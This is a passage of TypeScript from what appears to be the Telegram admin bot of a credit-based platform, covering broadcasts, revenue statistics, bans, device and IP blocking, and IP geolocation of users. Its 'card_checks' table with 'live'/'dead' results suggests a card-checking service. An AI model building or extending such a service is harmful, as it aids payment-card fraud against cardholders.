          await new Promise(resolve => setTimeout(resolve, 600));
          const emailSuccess = await sendBroadcastEmail(userEmail, p.username, cleanMessage, broadcastLink);
          if (emailSuccess) emailSent++;
        }
      }
    }

    // Delay between batches to avoid Telegram rate limits
    if (i + BATCH_SIZE < profiles.length) {
      await new Promise(resolve => setTimeout(resolve, 1500));
    }
  }

  await sendTelegramMessage(chatId, `
✅ <b>Broadcast Complete</b>

📱 Telegram: ${telegramSent}/${profiles.filter((p: any) => p.telegram_chat_id).length}
🌐 Web: ${webSent}/${profiles.length}
📧 Email: ${emailSent}/${totalWithEmail}${emailSkipped > 0 ? ` (${emailSkipped} opted out)` : ""}
`);
}

async function handleStats(chatId: string, supabase: any, messageId?: number): Promise<void> {
  const hasAccess = await isStaffAsync(chatId, supabase);
  if (!hasAccess) {
    if (messageId) {
      await editTelegramMessage(chatId, messageId, "❌ Access denied");
    } else {
      await sendTelegramMessage(chatId, "❌ Access denied");
    }
    return;
  }

  // Show loading
  const loadingMsg = "⏳ <b>Loading platform statistics...</b>";
  if (messageId) {
    await editTelegramMessage(chatId, messageId, loadingMsg);
  }

  // Fetch all data in parallel
  const now = new Date();
  const todayStart = new Date(now.getFullYear(), now.getMonth(), now.getDate()).toISOString();
  const weekStart = new Date(now.getFullYear(), now.getMonth(), now.getDate() - 7).toISOString();

  const [
    { data: stats },
    { data: allProfiles },
    { data: tickets },
    { data: allTopups },
    { data: todayTopups },
    { data: weekTopups },
    { data: pendingTopups },
  ] = await Promise.all([
    supabase.from("site_stats").select("*").eq("id", "global").maybeSingle(),
    supabase.from("profiles").select("is_banned, telegram_chat_id, credits"),
    supabase.from("support_tickets").select("status"),
    supabase.from("topup_transactions").select("amount, status, payment_method").eq("status", "completed"),
    supabase.from("topup_transactions").select("amount, status, payment_method").eq("status", "completed").gte("created_at", todayStart),
    supabase.from("topup_transactions").select("amount, status, payment_method").eq("status", "completed").gte("created_at", weekStart),
    supabase.from("topup_transactions").select("id").eq("status", "pending"),
  ]);

  // Credit-to-USDT conversion using package tiers
  const creditPackages = [
    { credits: 600, price: 15 },
    { credits: 2600, price: 60 },
    { credits: 4200, price: 90 },
    { credits: 7200, price: 150 },
    { credits: 30400, price: 600 },
    { credits: 62500, price: 1200 },
  ];
  
  function creditsToUsdt(credits: number): number {
    const pkg = creditPackages.find(p => p.credits === credits);
    if (pkg) return pkg.price;
    const sorted = [...creditPackages].sort((a, b) => Math.abs(a.credits - credits) - Math.abs(b.credits - credits));
    const closest = sorted[0];
    return Number(((credits / closest.credits) * closest.price).toFixed(2));
  }

  // User Stats
  const profiles = allProfiles || [];
  const totalUsers = stats?.total_users || profiles.length;
  const bannedUsers = profiles.filter((p: any) => p.is_banned).length;
  const telegramUsers = profiles.filter((p: any) => p.telegram_chat_id).length;
  const totalCreditsInCirculation = profiles.reduce((sum: number, p: any) => sum + (p.credits || 0), 0);

  // Get unique active users this week
  const { data: activeUsersData } = await supabase
    .from("card_checks")
    .select("user_id")
    .gte("created_at", weekStart);
  const activeUsers = new Set((activeUsersData || []).map((c: any) => c.user_id)).size;

  // Revenue Stats - convert credits to USDT
  const totalRevenueUsdt = (allTopups || []).reduce((sum: number, t: any) => sum + creditsToUsdt(Number(t.amount)), 0);
  const todayRevenueUsdt = (todayTopups || []).reduce((sum: number, t: any) => sum + creditsToUsdt(Number(t.amount)), 0);
  const weekRevenueUsdt = (weekTopups || []).reduce((sum: number, t: any) => sum + creditsToUsdt(Number(t.amount)), 0);
  const totalRevenueCredits = (allTopups || []).reduce((sum: number, t: any) => sum + Number(t.amount), 0);
  const pendingCount = (pendingTopups || []).length;

  // Ticket Stats
  const ticketStats = {
    open: (tickets || []).filter((t: any) => t.status === "open").length,
    processing: (tickets || []).filter((t: any) => t.status === "processing").length,
    solved: (tickets || []).filter((t: any) => t.status === "solved").length,
    closed: (tickets || []).filter((t: any) => t.status === "closed").length,
  };
  const totalTickets = (tickets || []).length;

  const timestamp = now.toLocaleString("en-US", {
    month: "short", day: "numeric", year: "numeric",
    hour: "2-digit", minute: "2-digit", timeZone: "UTC"
  });

  const statsMessage = `
📊 <b>Platform Statistics</b>
<i>Updated: ${timestamp} UTC</i>

━━━━━━━━━━━━━━━━━━━━━━

👥 <b>User Analytics</b>
┌ Total Users: <b>${totalUsers.toLocaleString()}</b>
├ 🟢 Active (7d): <b>${activeUsers.toLocaleString()}</b>
├ 📱 Telegram Linked: <b>${telegramUsers.toLocaleString()}</b>
├ 🚫 Banned: <b>${bannedUsers.toLocaleString()}</b>
└ 💰 Credits in Circulation: <b>${totalCreditsInCirculation.toLocaleString()}</b>

━━━━━━━━━━━━━━━━━━━━━━

💵 <b>Revenue (USDT)</b>
┌ All-Time: <b>$${totalRevenueUsdt.toLocaleString()} USDT</b> <i>(${totalRevenueCredits.toLocaleString()} credits)</i>
├ This Week: <b>$${weekRevenueUsdt.toLocaleString()} USDT</b>
├ Today: <b>$${todayRevenueUsdt.toLocaleString()} USDT</b>
└ ⏳ Pending Topups: <b>${pendingCount}</b>

━━━━━━━━━━━━━━━━━━━━━━

🎫 <b>Support Tickets</b> (${totalTickets})
┌ 🟡 Open: <b>${ticketStats.open}</b>
├ 🔵 Processing: <b>${ticketStats.processing}</b>
├ ✅ Solved: <b>${ticketStats.solved}</b>
└ ⚫ Closed: <b>${ticketStats.closed}</b>
`;

  const statsKeyboard = {
    inline_keyboard: [
      [{ text: "🔄 Refresh Stats", callback_data: "stats_refresh" }],
      [{ text: "🔙 Back to Menu", callback_data: "menu_back" }],
    ],
  };

  if (messageId) {
    await editTelegramMessage(chatId, messageId, statsMessage, statsKeyboard);
  } else {
    await sendTelegramMessage(chatId, statsMessage, statsKeyboard);
  }
}

async function handleViewBans(chatId: string, supabase: any, messageId?: number): Promise<void> {
  const hasAccess = await isStaffAsync(chatId, supabase);
  if (!hasAccess) {
    if (messageId) {
      await editTelegramMessage(chatId, messageId, "❌ Access denied");
    } else {
      await sendTelegramMessage(chatId, "❌ Access denied");
    }
    return;
  }

  const { data: banned } = await supabase
    .from("profiles")
    .select("user_id, username, ban_reason, banned_until")
    .eq("is_banned", true)
    .order("banned_at", { ascending: false });

  const bansKeyboard = { inline_keyboard: [[{ text: "🔙 Back to Menu", callback_data: "menu_back" }]] };

  if (!banned?.length) {
    if (messageId) {
      await editTelegramMessage(chatId, messageId, "✅ No banned users", bansKeyboard);
    } else {
      await sendTelegramMessage(chatId, "✅ No banned users", bansKeyboard);
    }
    return;
  }

  let list = "";
  for (const u of banned) {
    const status = u.banned_until ? `⏳ Until ${new Date(u.banned_until).toLocaleDateString()}` : "🔴 Permanent";
    list += `\n• <b>${u.username || u.user_id}</b>\n  ${status} | ${u.ban_reason || "No reason"}`;
  }

  const bansMessage = `
🚫 <b>Banned Users</b> (${banned.length})
${list}

<i>Use /unbanuser [user] to unban</i>
`;

  if (messageId) {
    await editTelegramMessage(chatId, messageId, bansMessage, bansKeyboard);
  } else {
    await sendTelegramMessage(chatId, bansMessage, bansKeyboard);
  }
}

async function handleViewBlocked(chatId: string, supabase: any, messageId?: number): Promise<void> {
  const isAdmin = await isAdminAsync(chatId, supabase);
  if (!isAdmin) {
    if (messageId) {
      await editTelegramMessage(chatId, messageId, "❌ Access denied - Admin only");
    } else {
      await sendTelegramMessage(chatId, "❌ Access denied - Admin only");
    }
    return;
  }

  const { data: blockedDevices, error } = await supabase
    .from("blocked_devices")
    .select("id, fingerprint, ip_address, reason, banned_user_id, is_active, created_at")
    .eq("is_active", true)
    .order("created_at", { ascending: false });

  const blockedKeyboard = { inline_keyboard: [[{ text: "🔙 Back to Menu", callback_data: "menu_back" }]] };

  if (error) {
    console.error("Error fetching blocked devices:", error);
    if (messageId) {
      await editTelegramMessage(chatId, messageId, "❌ Error fetching blocked devices", blockedKeyboard);
    } else {
      await sendTelegramMessage(chatId, "❌ Error fetching blocked devices", blockedKeyboard);
    }
    return;
  }

  if (!blockedDevices?.length) {
    if (messageId) {
      await editTelegramMessage(chatId, messageId, "✅ No blocked devices or IPs", blockedKeyboard);
    } else {
      await sendTelegramMessage(chatId, "✅ No blocked devices or IPs", blockedKeyboard);
    }
    return;
  }

  // Get usernames for banned users
  const userIds = [...new Set(blockedDevices.map((d: any) => d.banned_user_id))];
  const { data: profiles } = await supabase
    .from("profiles")
    .select("user_id, username")
    .in("user_id", userIds);

  const usernameMap: Record<string, string> = {};
  profiles?.forEach((p: any) => {
    usernameMap[p.user_id] = p.username || "Unknown";
  });

  // Count unique fingerprints and IPs
  const uniqueFingerprints = new Set(blockedDevices.filter((d: any) => d.fingerprint).map((d: any) => d.fingerprint)).size;
  const uniqueIPs = new Set(blockedDevices.filter((d: any) => d.ip_address).map((d: any) => d.ip_address)).size;

  let list = "";
  // Limit to first 15 entries to avoid message too long
  const displayDevices = blockedDevices.slice(0, 15);
  
  for (const d of displayDevices) {
    const username = usernameMap[d.banned_user_id] || "Unknown";
    const date = new Date(d.created_at).toLocaleDateString("en-US", { month: "short", day: "numeric" });
    const fingerprint = d.fingerprint ? `🔐 ${d.fingerprint.slice(0, 8)}...` : "";
    const ip = d.ip_address ? `🌐 ${d.ip_address}` : "";
    const details = [fingerprint, ip].filter(Boolean).join(" | ");
    
    list += `\n• <b>${username}</b> (${date})\n  ${details}\n  📝 ${d.reason || "No reason"}`;
  }

  const blockedMessage = `
🚫 <b>Blocked Devices & IPs</b>

📊 <b>Summary</b>
• Active blocks: ${blockedDevices.length}
• Unique fingerprints: ${uniqueFingerprints}
• Unique IPs: ${uniqueIPs}

<b>Recent Blocks</b>${list}${blockedDevices.length > 15 ? `\n\n<i>...and ${blockedDevices.length - 15} more</i>` : ""}

<i>Blocks are removed when users are unbanned</i>
`;

  if (messageId) {
    await editTelegramMessage(chatId, messageId, blockedMessage, blockedKeyboard);
  } else {
    await sendTelegramMessage(chatId, blockedMessage, blockedKeyboard);
  }
}

async function handleUnblockDevice(chatId: string, identifier: string, supabase: any): Promise<void> {
  const isAdmin = await isAdminAsync(chatId, supabase);
  if (!isAdmin) {
    await sendTelegramMessage(chatId, "❌ Access denied - Admin only");
    return;
  }

  if (!identifier) {
    await sendTelegramMessage(chatId, `
❌ <b>Usage:</b> /unblockdevice <code>[identifier]</code>

<b>Identifier can be:</b>
• IP address (e.g., 192.168.1.1)
• Fingerprint prefix (first 8+ chars)
• Username of blocked user
• Block ID (first 8 chars from /viewblocked)

<b>Examples:</b>
• /unblockdevice 192.168.1.1
• /unblockdevice abc12345
• /unblockdevice john_doe
`);
    return;
  }

  const trimmedId = identifier.trim().toLowerCase();
  
  // Try to find matching blocks
  const { data: allBlocks, error } = await supabase
    .from("blocked_devices")
    .select("id, fingerprint, ip_address, banned_user_id, reason, is_active")
    .eq("is_active", true);

  if (error) {
    await sendTelegramMessage(chatId, "❌ Error fetching blocked devices");
    return;
  }

  if (!allBlocks || allBlocks.length === 0) {
    await sendTelegramMessage(chatId, "✅ No active blocks found");
    return;
  }

  // Get profiles to match by username
  const userIds = [...new Set(allBlocks.map((b: any) => b.banned_user_id))];
  const { data: profiles } = await supabase
    .from("profiles")
    .select("user_id, username")
    .in("user_id", userIds);

  const usernameToUserId: Record<string, string> = {};
  profiles?.forEach((p: any) => {
    if (p.username) {
      usernameToUserId[p.username.toLowerCase()] = p.user_id;
    }
  });

  // Find matching blocks
  let matchingBlocks: any[] = [];

  // Match by IP address
  matchingBlocks = allBlocks.filter((b: any) => 
    b.ip_address && b.ip_address.toLowerCase() === trimmedId
  );

  // Match by fingerprint prefix
  if (matchingBlocks.length === 0) {
    matchingBlocks = allBlocks.filter((b: any) => 
      b.fingerprint && b.fingerprint.toLowerCase().startsWith(trimmedId)
    );
  }

  // Match by block ID prefix
  if (matchingBlocks.length === 0) {
    matchingBlocks = allBlocks.filter((b: any) => 
      b.id.toLowerCase().startsWith(trimmedId)
    );
  }

  // Match by username
  if (matchingBlocks.length === 0) {
    const matchedUserId = usernameToUserId[trimmedId];
    if (matchedUserId) {
      matchingBlocks = allBlocks.filter((b: any) => b.banned_user_id === matchedUserId);
    }
  }

  if (matchingBlocks.length === 0) {
    await sendTelegramMessage(chatId, `❌ No blocks found matching: <code>${identifier}</code>`);
    return;
  }

  // Deactivate matching blocks
  const blockIds = matchingBlocks.map((b: any) => b.id);
  const { error: updateError } = await supabase
    .from("blocked_devices")
    .update({ is_active: false })
    .in("id", blockIds);

  if (updateError) {
    console.error("Error unblocking devices:", updateError);
    await sendTelegramMessage(chatId, "❌ Error removing blocks");
    return;
  }

  // Build summary
  const fingerprints = matchingBlocks.filter((b: any) => b.fingerprint).length;
  const ips = matchingBlocks.filter((b: any) => b.ip_address).length;

  await sendTelegramMessage(chatId, `
✅ <b>Blocks Removed</b>

📊 <b>Summary</b>
• Total removed: ${matchingBlocks.length}
• Fingerprints: ${fingerprints}
• IP addresses: ${ips}

<i>The affected devices/IPs can now access the site again.</i>
`);
}

async function handleBlockDevice(chatId: string, args: string, supabase: any): Promise<void> {
  const isAdmin = await isAdminAsync(chatId, supabase);
  if (!isAdmin) {
    await sendTelegramMessage(chatId, "❌ Access denied - Admin only");
    return;
  }

  if (!args) {
    await sendTelegramMessage(chatId, `
❌ <b>Usage:</b> /blockdevice <code>[type] [value] [reason]</code>

<b>Types:</b>
• <code>ip</code> - Block an IP address
• <code>fp</code> - Block a fingerprint

<b>Examples:</b>
• /blockdevice ip 192.168.1.1 Suspicious activity
• /blockdevice fp abc123def456 Known bad actor
• /blockdevice ip 10.0.0.5

<i>Reason is optional but recommended.</i>
`);
    return;
  }

  const parts = args.split(/\s+/);
  const type = parts[0]?.toLowerCase();
  const value = parts[1];
  const reason = parts.slice(2).join(" ") || "Manually blocked by admin";

  if (!type || !value) {
    await sendTelegramMessage(chatId, "❌ Please provide both type (ip/fp) and value");
    return;
  }

  if (type !== "ip" && type !== "fp") {
    await sendTelegramMessage(chatId, "❌ Type must be <code>ip</code> or <code>fp</code>");
    return;
  }

  // Validate IP format
  if (type === "ip") {
    const ipRegex = /^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
    if (!ipRegex.test(value)) {
      await sendTelegramMessage(chatId, "❌ Invalid IP address format");
      return;
    }
  }

  // Validate fingerprint format (at least 8 characters)
  if (type === "fp" && value.length < 8) {
    await sendTelegramMessage(chatId, "❌ Fingerprint must be at least 8 characters");
    return;
  }

  // Check if already blocked
  const checkField = type === "ip" ? "ip_address" : "fingerprint";
  const { data: existing } = await supabase
    .from("blocked_devices")
    .select("id")
    .eq(checkField, value)
    .eq("is_active", true)
    .maybeSingle();

  if (existing) {
    await sendTelegramMessage(chatId, `⚠️ This ${type === "ip" ? "IP address" : "fingerprint"} is already blocked`);
    return;
  }

  // Get admin's user_id for tracking
  const { data: adminProfile } = await supabase
    .from("profiles")
    .select("user_id")
    .eq("telegram_chat_id", chatId)
    .maybeSingle();

  // Insert the block - use a placeholder UUID for banned_user_id since it's required
  const blockData: any = {
    banned_user_id: "00000000-0000-0000-0000-000000000000", // Placeholder for manual blocks
    banned_by_admin_id: adminProfile?.user_id || null,
    reason: reason,
    is_active: true,
  };

  if (type === "ip") {
    blockData.ip_address = value;
  } else {
    blockData.fingerprint = value;
  }

  const { error } = await supabase
    .from("blocked_devices")
    .insert(blockData);

  if (error) {
    console.error("Error blocking device:", error);
    await sendTelegramMessage(chatId, "❌ Error creating block");
    return;
  }

  const emoji = type === "ip" ? "🌐" : "🔐";
  await sendTelegramMessage(chatId, `
✅ <b>Device Blocked</b>

${emoji} <b>${type === "ip" ? "IP Address" : "Fingerprint"}:</b> <code>${value}</code>
📝 <b>Reason:</b> ${reason}

<i>This ${type === "ip" ? "IP" : "device"} is now blocked from accessing the site.</i>
`);
}

// ═══════════════════════════════════════════════════════════
// IP LOOKUP HELPER
// ═══════════════════════════════════════════════════════════

interface IPDetails {
  ip: string;
  decimal?: string;
  hostname?: string;
  asn?: string;
  isp?: string;
  services?: string;
  country?: string;
  countryCode?: string;
  state?: string;
  city?: string;
  zip?: string;
  latitude?: string;
  longitude?: string;
  timezone?: string;
  proxy?: boolean;
  mobile?: boolean;
  hosting?: boolean;
}

// Convert decimal degrees to DMS (Degrees, Minutes, Seconds) format
function decimalToDMS(decimal: number, isLatitude: boolean): string {
  const absolute = Math.abs(decimal);
  const degrees = Math.floor(absolute);
  const minutesFloat = (absolute - degrees) * 60;
  const minutes = Math.floor(minutesFloat);
  const seconds = ((minutesFloat - minutes) * 60).toFixed(2);
  
  const direction = isLatitude
    ? (decimal >= 0 ? "N" : "S")
    : (decimal >= 0 ? "E" : "W");
  
  return `${degrees}° ${minutes}′ ${seconds}″ ${direction}`;
}

// Format latitude with decimal and DMS
function formatLatitude(lat: string | undefined): string {
  if (!lat) return "N/A";
  const num = parseFloat(lat);
  if (isNaN(num)) return lat;
  return `${lat} (${decimalToDMS(num, true)})`;
}

// Format longitude with decimal and DMS
function formatLongitude(lon: string | undefined): string {
  if (!lon) return "N/A";
  const num = parseFloat(lon);
  if (isNaN(num)) return lon;
  return `${lon} (${decimalToDMS(num, false)})`;
}

async function fetchIPDetails(ip: string): Promise<IPDetails | null> {
  if (!ip || ip === "Unknown" || ip === "unknown") return null;
  
  try {
    // Use ip-api.com for reliable JSON response (free, no auth required)
    // Request all available fields for comprehensive info
    const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,reverse,query,proxy,mobile,hosting`);
    
    if (!response.ok) {
      console.error(`IP lookup failed for ${ip}: ${response.status}`);
      return null;
    }
    
    const data = await response.json();
    
    if (data.status === "fail") {
      console.error(`IP lookup failed for ${ip}: ${data.message}`);
      return null;
    }
    
    // Convert IP to decimal
    const ipParts = ip.split('.').map(Number);
    let decimal: string | undefined;
    if (ipParts.length === 4 && ipParts.every(p => !isNaN(p) && p >= 0 && p <= 255)) {
      decimal = ((ipParts[0] * 16777216) + (ipParts[1] * 65536) + (ipParts[2] * 256) + ipParts[3]).toString();
    }
    
    const details: IPDetails = {
      ip: data.query || ip,
      decimal,
      hostname: data.reverse || undefined,
      asn: data.as || undefined,
      isp: data.isp || undefined,
      services: data.org || undefined,
      country: data.country || undefined,
      countryCode: data.countryCode || undefined,
      state: data.regionName || undefined,
      city: data.city || undefined,
      zip: data.zip || undefined,
      latitude: data.lat?.toString() || undefined,
      longitude: data.lon?.toString() || undefined,
      timezone: data.timezone || undefined,
      proxy: data.proxy || false,
      mobile: data.mobile || false,
      hosting: data.hosting || false,
    };
    
    return details;
  } catch (error) {
    console.error(`Error fetching IP details for ${ip}:`, error);
    return null;
  }
}

async function handleUserDevices(chatId: string, identifier: string, supabase: any): Promise<void> {
  const isAdmin = await isAdminAsync(chatId, supabase);
  if (!isAdmin) {
    await sendTelegramMessage(chatId, "❌ Access denied - Admin only");
    return;
  }

  if (!identifier) {
    await sendTelegramMessage(chatId, `
❌ <b>Usage:</b> /userdevices <code>[email/username]</code>

<b>Examples:</b>
• /userdevices john@example.com
• /userdevices john_doe
`);
    return;
  }

  // Find user by email or username
  let profile = null;
  let userEmail = null;

  const { data: authData } = await supabase.auth.admin.listUsers();
  const authUsers = authData?.users || [];

  // Try by email
  const authUser = authUsers.find((u: any) => u.email?.toLowerCase() === identifier.toLowerCase());
  if (authUser) {
    userEmail = authUser.email;
    const { data: p } = await supabase.from("profiles").select("*").eq("user_id", authUser.id).maybeSingle();
    profile = p;
  }

  // Try by username
  if (!profile) {
    const { data: p } = await supabase.from("profiles").select("*").ilike("username", identifier).maybeSingle();
    if (p) {
      profile = p;
      userEmail = authUsers.find((u: any) => u.id === p.user_id)?.email || null;
    }
  }

  // Try by telegram chat ID
  if (!profile) {
    const { data: p } = await supabase.from("profiles").select("*").eq("telegram_chat_id", identifier).maybeSingle();
    if (p) {
      profile = p;
      userEmail = authUsers.find((u: any) => u.id === p.user_id)?.email || null;
    }
  }

  if (!profile) {
    await sendTelegramMessage(chatId, `❌ User not found: <code>${identifier}</code>`);
    return;
  }

  // Fetch device logs for this user
  const { data: deviceLogs, error } = await supabase
    .from("user_device_logs")
    .select("id, fingerprint, ip_address, user_agent, last_seen, created_at")
    .eq("user_id", profile.user_id)
    .order("last_seen", { ascending: false });

  if (error) {
    console.error("Error fetching device logs:", error);
    await sendTelegramMessage(chatId, "❌ Error fetching device data");
    return;
  }

  if (!deviceLogs || deviceLogs.length === 0) {
    await sendTelegramMessage(chatId, `
📱 <b>User Devices</b>

👤 <b>User:</b> ${profile.username || "Unknown"}
📧 <b>Email:</b> ${userEmail || "Unknown"}

<i>No device data recorded for this user.</i>
`);
    return;
  }

  // Check which devices are blocked
  const fingerprints = deviceLogs.map((d: any) => d.fingerprint);
  const ips = deviceLogs.map((d: any) => d.ip_address).filter(Boolean);

  const { data: blockedFingerprints } = await supabase
    .from("blocked_devices")
    .select("fingerprint")
    .in("fingerprint", fingerprints)
    .eq("is_active", true);

  const { data: blockedIPs } = await supabase
    .from("blocked_devices")
    .select("ip_address")
    .in("ip_address", ips)
    .eq("is_active", true);

  const blockedFpSet = new Set(blockedFingerprints?.map((b: any) => b.fingerprint) || []);
  const blockedIpSet = new Set(blockedIPs?.map((b: any) => b.ip_address) || []);

  // Fetch IP details for unique IPs (limit to first 5 devices to avoid timeout)
  const displayDevices = deviceLogs.slice(0, 5);
  const uniqueIPs = [...new Set(displayDevices.map((d: any) => d.ip_address).filter(Boolean))];
  
  // Fetch IP details in parallel
  const ipDetailsMap = new Map<string, IPDetails | null>();
  const ipDetailsPromises = uniqueIPs.map(async (ip) => {
    const details = await fetchIPDetails(ip as string);
    ipDetailsMap.set(ip as string, details);
  });
  
  await Promise.all(ipDetailsPromises);

  // Build device list with IP details
  let deviceList = "";

  for (const device of displayDevices) {
    const lastSeen = new Date(device.last_seen).toLocaleDateString("en-US", { 
      month: "short", day: "numeric", hour: "2-digit", minute: "2-digit" 
    });
    const fpBlocked = blockedFpSet.has(device.fingerprint) ? " 🚫" : "";
    const ipBlocked = blockedIpSet.has(device.ip_address) ? " 🚫" : "";
    
    // Parse user agent for browser/OS
    const ua = device.user_agent || "";
    let browser = "Unknown";
    let os = "Unknown";
    
    if (ua.includes("Chrome")) browser = "Chrome";
    else if (ua.includes("Firefox")) browser = "Firefox";
    else if (ua.includes("Safari")) browser = "Safari";
    else if (ua.includes("Edge")) browser = "Edge";
    
    if (ua.includes("Windows")) os = "Windows";
    else if (ua.includes("Mac")) os = "macOS";
    else if (ua.includes("Linux")) os = "Linux";
    else if (ua.includes("Android")) os = "Android";
    else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";

    deviceList += `
━━━━━━━━━━━━━━━━━━
🔐 <b>Fingerprint:</b> <code>${device.fingerprint}</code>${fpBlocked}
💻 <b>Device:</b> ${browser} on ${os}
🕐 <b>Last Seen:</b> ${lastSeen}`;

    // Add IP details
    const ipDetails = device.ip_address ? ipDetailsMap.get(device.ip_address) : null;
    
    deviceList += `

📍 <b>IP Details For:</b> <code>${device.ip_address || "Unknown"}</code>${ipBlocked}`;
    
    if (ipDetails) {
      deviceList += `\n   • <b>Decimal:</b> ${escapeHtml(ipDetails.decimal || "N/A")}`;
      deviceList += `\n   • <b>Hostname:</b> ${escapeHtml(ipDetails.hostname || "N/A")}`;
      deviceList += `\n   • <b>ASN:</b> ${escapeHtml(ipDetails.asn || "N/A")}`;
      deviceList += `\n   • <b>ISP:</b> ${escapeHtml(ipDetails.isp || "N/A")}`;
      deviceList += `\n   • <b>Organization:</b> ${escapeHtml(ipDetails.services || "N/A")}`;
      
      // Connection type flags
      const flags: string[] = [];
      if (ipDetails.proxy) flags.push("🔒 Proxy/VPN");
      if (ipDetails.mobile) flags.push("📱 Mobile");
      if (ipDetails.hosting) flags.push("🖥️ Hosting/DC");
      if (flags.length > 0) {
        deviceList += `\n   • <b>Services:</b> ${flags.join(", ")}`;
      } else {
        deviceList += `\n   • <b>Services:</b> None detected`;
      }
      
      // Location section
      deviceList += `\n\n   🌍 <b>Location:</b>`;
      deviceList += `\n   • <b>Country:</b> ${escapeHtml(ipDetails.country || "N/A")}${ipDetails.countryCode ? ` (${escapeHtml(ipDetails.countryCode)})` : ""}`;
      deviceList += `\n   • <b>State/Region:</b> ${escapeHtml(ipDetails.state || "N/A")}`;
      deviceList += `\n   • <b>City:</b> ${escapeHtml(ipDetails.city || "N/A")}`;
      if (ipDetails.zip) deviceList += `\n   • <b>ZIP/Postal:</b> ${escapeHtml(ipDetails.zip)}`;
      if (ipDetails.timezone) deviceList += `\n   • <b>Timezone:</b> ${escapeHtml(ipDetails.timezone)}`;
      deviceList += `\n   • <b>Latitude:</b> ${escapeHtml(formatLatitude(ipDetails.latitude))}`;
      deviceList += `\n   • <b>Longitude:</b> ${escapeHtml(formatLongitude(ipDetails.longitude))}`;

      // Add Google Maps link if coordinates available
      if (ipDetails.latitude && ipDetails.longitude) {
        deviceList += `\n   • 🗺️ <a href="https://www.google.com/maps?q=${ipDetails.latitude},${ipDetails.longitude}">View on Google Maps</a>`;
      }
    } else if (device.ip_address) {
      deviceList += `\n   <i>IP details unavailable</i>`;
    }
  }

  const message = `
📱 <b>User Devices</b>

👤 <b>User:</b> ${profile.username || "Unknown"}
📧 <b>Email:</b> ${userEmail || "Unknown"}
🆔 <b>User ID:</b> <code>${profile.user_id.slice(0, 8)}...</code>

📊 <b>Total Devices:</b> ${deviceLogs.length}
🚫 <b>Blocked:</b> ${blockedFpSet.size} fingerprints, ${blockedIpSet.size} IPs
${deviceList}${deviceLogs.length > 5 ? `\n\n<i>...and ${deviceLogs.length - 5} more devices</i>` : ""}

<i>Use /blockdevice to block specific devices</i>
`;

  await sendTelegramMessage(chatId, message);
}

async function handleUserInfo(chatId: string, identifier: string, supabase: any): Promise<void> {
  const hasAccess = await isStaffAsync(chatId, supabase);
  const isAdminUser = await isAdminAsync(chatId, supabase);
  if (!hasAccess) {
    await sendTelegramMessage(chatId, "❌ Access denied");
    return;
  }

  if (!identifier) {
    await sendTelegramMessage(chatId, "❌ <b>Usage:</b> /userinfo <code>[email/username/chat_id]</code>");
    return;
  }

  let profile = null;
  let userEmail = null;
  let authUserData = null;

  const { data: authData } = await supabase.auth.admin.listUsers();
  const authUsers = authData?.users || [];

  // Try by email
  const authUser = authUsers.find((u: any) => u.email?.toLowerCase() === identifier.toLowerCase());
  if (authUser) {
    userEmail = authUser.email;
    authUserData = authUser;
    const { data: p } = await supabase.from("profiles").select("*").eq("user_id", authUser.id).maybeSingle();
    profile = p;
  }

  // Try by username
  if (!profile) {
    const { data: p } = await supabase.from("profiles").select("*").ilike("username", identifier).maybeSingle();
    if (p) {
      profile = p;
      authUserData = authUsers.find((u: any) => u.id === p.user_id);
      userEmail = authUserData?.email || null;
    }
  }

  // Try by telegram
  if (!profile) {
    const { data: p } = await supabase.from("profiles").select("*").eq("telegram_chat_id", identifier).maybeSingle();
    if (p) {
      profile = p;
      authUserData = authUsers.find((u: any) => u.id === p.user_id);
      userEmail = authUserData?.email || null;
    }
  }

  if (!profile) {
    await sendTelegramMessage(chatId, `❌ User not found: ${identifier}`);
    return;
  }

  // Fetch all user data in parallel
  const [
    checksResult,
    liveCardsResult,
    deadCardsResult,
    topupsResult,
    ticketsResult,
    devicesResult,
    sessionsResult,
    rolesResult,
    blockedResult,
    topupDetailsResult,
    openTicketsResult,
    recentChecksResult,
    notificationPrefsResult,
    spendingAlertsResult
  ] = await Promise.all([
    supabase.from("card_checks").select("*", { count: "exact", head: true }).eq("user_id", profile.user_id),
    supabase.from("card_checks").select("*", { count: "exact", head: true }).eq("user_id", profile.user_id).eq("result", "live"),
    supabase.from("card_checks").select("*", { count: "exact", head: true }).eq("user_id", profile.user_id).eq("result", "dead"),
    supabase.from("topup_transactions").select("*", { count: "exact", head: true }).eq("user_id", profile.user_id),
    supabase.from("support_tickets").select("*", { count: "exact", head: true }).eq("user_id", profile.user_id),
    supabase.from("user_device_logs").select("*").eq("user_id", profile.user_id).order("last_seen", { ascending: false }).limit(10),
    supabase.from("user_sessions").select("*").eq("user_id", profile.user_id).order("last_active", { ascending: false }).limit(5),
    supabase.from("user_roles").select("role").eq("user_id", profile.user_id),
    supabase.from("blocked_devices").select("*").eq("banned_user_id", profile.user_id).eq("is_active", true),
    supabase.from("topup_transactions").select("*").eq("user_id", profile.user_id).order("created_at", { ascending: false }).limit(5),
    supabase.from("support_tickets").select("*").eq("user_id", profile.user_id).eq("status", "open"),
    supabase.from("card_checks").select("created_at, result, gateway").eq("user_id", profile.user_id).order("created_at", { ascending: false }).limit(5),
    supabase.from("notification_preferences").select("*").eq("user_id", profile.user_id).maybeSingle(),
    supabase.from("spending_alert_settings").select("*").eq("user_id", profile.user_id).maybeSingle()
  ]);

  const checks = checksResult.count || 0;
  const liveCards = liveCardsResult.count || 0;
  const deadCards = deadCardsResult.count || 0;
  const topupsCount = topupsResult.count || 0;
  const ticketsCount = ticketsResult.count || 0;
  const devices = devicesResult.data || [];
  const sessions = sessionsResult.data || [];
  const roles = rolesResult.data || [];
  const blockedDevices = blockedResult.data || [];
  const topupDetails = topupDetailsResult.data || [];
  const openTickets = openTicketsResult.data || [];
  const recentChecks = recentChecksResult.data || [];
  const notificationPrefs = notificationPrefsResult.data;
  const spendingAlerts = spendingAlertsResult.data;

  // Calculate totals
  const totalCreditsAdded = topupDetails
    .filter((t: any) => t.status === "completed")
    .reduce((sum: number, t: any) => sum + Number(t.amount), 0);
  
  const pendingTopups = topupDetails.filter((t: any) => t.status === "pending").length;

  let status = "✅ Active";
  if (profile.is_banned) {
    status = profile.banned_until 
